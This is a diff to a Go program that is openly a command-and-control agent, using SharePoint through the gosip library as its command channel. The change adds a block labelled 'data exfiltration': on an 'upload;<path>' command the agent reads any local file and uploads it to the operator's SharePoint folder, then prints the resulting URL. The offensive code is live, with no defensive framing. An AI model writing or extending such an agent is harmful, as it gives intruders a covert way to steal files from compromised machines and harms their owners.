@@ -7,6 +7,8 @@ import (
 	"io/ioutil"
 	"os/exec"
 	"os"
+	"strings"
+	"path/filepath"
 	"runtime"
 	"github.com/koltyakov/gosip"
 	"github.com/koltyakov/gosip/api"
@@ -83,6 +85,32 @@ func main() {
 			fmt.Println("[C2] Agent Termination Command Received")
 			break
 		}	
+		
+		// data exfiltration
+	    
+	    	if strings.HasPrefix(cellValue, "upload") {
+	    
+	    		splittedCellValue := strings.Split(cellValue, ";")
+	    		fileToUpload := splittedCellValue[1]
+	    	
+	    		content2, err := ioutil.ReadFile(fileToUpload)
+	    		if err != nil {
+				log.Fatal(err)
+	    		}
+	    		fileName := filepath.Base(fileToUpload)
+	    		fileAddResp2, err := folder.Files().Add(fileName,content2,true)
+	    		if err != nil {
+				log.Fatal(err)
+	    		}
+	    		time.Sleep(1 * time.Second)
+			fmt.Printf("[Command Executed] Upload of file: %s\n",fileToUpload)
+	    		fmt.Printf("[Command Executed] Output file URL: %s\n", fileAddResp2.Data().ServerRelativeURL)
+	    
+	    		time.Sleep(15 * time.Second)
+	    		continue
+	    
+	    	}
+		
 		
 		fmt.Println("[C2] Command Requested: " + cellValue)
 
